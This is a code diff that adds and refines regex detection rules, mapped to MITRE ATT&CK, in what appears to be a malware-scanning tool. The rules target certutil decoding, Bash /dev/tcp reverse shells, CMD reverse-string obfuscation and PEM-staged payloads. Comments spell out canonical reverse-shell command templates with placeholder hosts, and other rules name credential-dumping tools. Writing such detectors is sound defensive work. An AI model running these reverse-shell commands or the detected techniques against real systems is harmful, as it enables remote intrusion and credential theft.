@@ -838,7 +838,7 @@ MITRE_HEURISTICS = [
     (r"wmic\s|win32_process", ("T1047", "Windows Management Instrumentation", "Execution")),
     (r"rundll32\.exe", ("T1218.011", "Rundll32", "Defense Evasion")),
     (r"mshta\.exe", ("T1218.005", "Mshta", "Defense Evasion")),
-    (r"certutil\.exe.*-decode", ("T1140", "Deobfuscate/Decode Files", "Defense Evasion")),
+    (r"certutil(?:\.exe)?\s+.{0,80}-decode\b", ("T1140", "Deobfuscate/Decode Files", "Defense Evasion")),
     (r"-nop|-noni|-w\s*hidden|-windowstyle\s+hidden", ("T1059.001", "PowerShell (hidden)", "Execution")),
     (r"vssadmin.*delete.*shadows", ("T1490", "Inhibit System Recovery", "Impact")),
     (r"cipher\s+/w|sdelete", ("T1070.004", "File Deletion", "Defense Evasion")),
@@ -879,9 +879,20 @@ MITRE_HEURISTICS = [
     # Env-var slicing: `${VAR:start:len}` used to build commands character-by-character
     (r"\$\{\w+:\d+:\d+\}",
         ("T1027.010", "Command Obfuscation (env-var slicing)", "Defense Evasion")),
-    # curl/wget download-and-exec (bash equivalent of Net.WebClient.DownloadString)
-    (r"(?:curl|wget)\s+[^|]*\|\s*(?:sh|bash|zsh|dash|ksh|python\d?)\b",
-        ("T1105", "Ingress Tool Transfer (curl/wget pipe-to-shell)", "Command and Control")),
+    # ── Reverse-shell / non-application-layer C2 (Feb 2026) ──────────────
+    # Bash & sh reverse-shell canonical patterns:
+    #   exec 3<>/dev/tcp/HOST/PORT
+    #   bash -i >& /dev/tcp/HOST/PORT 0>&1
+    #   sh -c '0<&196;exec 196<>/dev/tcp/HOST/PORT'
+    (r"/dev/(?:tcp|udp)/[a-z0-9.\-\{\}$\{\}%]+/\d{1,5}",
+        ("T1095", "Non-Application Layer Protocol (Bash /dev/tcp reverse shell)", "Command and Control")),
+    (r"/dev/(?:tcp|udp)/[a-z0-9.\-\{\}$\{\}%]+/(?:4444|1337|8080|9001|31337|443)\b",
+        ("T1571", "Non-Standard Port", "Command and Control")),
+    (r"bash\s+-[il]?\s*>&\s*/dev/(?:tcp|udp)/|exec\s+\d+\s*<>\s*/dev/(?:tcp|udp)/",
+        ("T1059.004", "Unix Shell (reverse shell)", "Execution")),
+    # ── CMD reverse-string for-loop (Emotet / QakBot / IcedID) ───────────
+    (r"for\s*/L\s+%[a-z]\s+in\s*\(\s*\d+\s*,\s*-1\s*,\s*0\s*\)\s+do\s+.*?!\w+:~%",
+        ("T1027.010", "Command Obfuscation (CMD reverse-string for-loop)", "Defense Evasion")),
 ]
 
 
@@ -908,7 +919,7 @@ YARA_LITE = [
     {"rule": "Defanged_IOC", "severity": "low", "pattern": r"hxxp[s]?://|\[\.\]", "desc": "Defanged indicator (analyst-supplied)"},
     {"rule": "Base64_Long_Blob", "severity": "low", "pattern": r"[A-Za-z0-9+/]{80,}={0,2}", "desc": "Long Base64 blob"},
     {"rule": "Ransom_Note_Keywords", "severity": "medium", "pattern": r"\b(your files.*encrypted|bitcoin|btc address|decryption key|ransom|tor browser)\b", "desc": "Ransom note keyword cluster"},
-    {"rule": "Certutil_Decode", "severity": "high", "pattern": r"certutil\.exe.*-decode", "desc": "Living-off-the-land: certutil decoding payloads"},
+    {"rule": "Certutil_Decode", "severity": "high", "pattern": r"certutil(?:\.exe)?\s+.{0,80}-decode\b", "desc": "Living-off-the-land: certutil decoding payloads"},
     {"rule": "Mshta_Remote", "severity": "high", "pattern": r"mshta\.exe\s+https?://", "desc": "Remote HTA execution"},
     {"rule": "LSASS_Access", "severity": "high", "pattern": r"lsass|sekurlsa::|mimikatz", "desc": "LSASS / credential dumping references"},
     {"rule": "Shadow_Copy_Delete", "severity": "high", "pattern": r"vssadmin.*delete.*shadows|wmic.*shadowcopy.*delete", "desc": "Shadow copy deletion (ransomware precursor)"},
@@ -955,6 +966,21 @@ YARA_LITE = [
     {"rule": "PS_Char_Int_Cast", "severity": "medium",
      "pattern": r"\[char\]\s*\[int\]|\[char\]\s*\d+",
      "desc": "PowerShell [char][int] cast — char-code payload reconstruction"},
+    # ── Reverse-shell / raw-TCP C2 (Feb 2026) ───────────────────────────
+    {"rule": "Bash_Dev_TCP_RevShell", "severity": "high",
+     "pattern": r"/dev/(?:tcp|udp)/[a-z0-9.\-\{\}$\{\}%]+/\d{1,5}",
+     "desc": "Bash /dev/tcp raw-socket reverse shell (MITRE T1095/T1571)"},
+    {"rule": "Bash_Exec_FD_RevShell", "severity": "high",
+     "pattern": r"exec\s+\d+\s*<\s*>\s*/dev/(?:tcp|udp)/",
+     "desc": "Bash file-descriptor exec-redirect to /dev/tcp (canonical reverse shell)"},
+    # ── CMD for-loop reverse-string (Emotet, QakBot family) ─────────────
+    {"rule": "CMD_ForLoop_Reverse_String", "severity": "high",
+     "pattern": r"for\s*/L\s+%[a-z]\s+in\s*\(\s*\d+\s*,\s*-1\s*,\s*0\s*\)\s+do\s+.*?!\w+:~%",
+     "desc": "CMD `for /L` reverse-string obfuscation — Emotet / QakBot canonical pattern"},
+    # ── Certutil PEM-wrapped base64 (LOLBAS payload staging) ────────────
+    {"rule": "Certutil_PEM_Wrapped_Payload", "severity": "high",
+     "pattern": r"-{5}BEGIN\s+CERTIFICATE-{5}[\s\S]{20,}-{5}END\s+CERTIFICATE-{5}",
+     "desc": "PEM-wrapped base64 blob (often paired with certutil -decode for PE staging)"},
 ]
 
 
